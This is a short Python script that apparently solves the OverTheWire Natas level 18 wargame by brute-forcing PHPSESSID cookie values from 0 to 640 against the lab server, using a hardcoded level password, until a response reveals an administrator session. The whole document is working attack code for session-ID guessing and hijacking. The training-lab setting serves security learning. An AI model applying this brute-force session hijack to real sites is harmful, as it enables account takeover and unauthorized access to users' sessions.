#!/bin/python3
import requests

user = 'natas18'
passwd = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
target = 'http://natas18.natas.labs.overthewire.org'

for i in range(641):
    r = requests.get(
    	target,
    	auth=(user, passwd),
    	cookies={'PHPSESSID': str(i)}
    	)
    print("[REQUEST] PHPSESSID=%s" % i)
    if 'You are an admin' in r.text:
        print(r.text)
        break
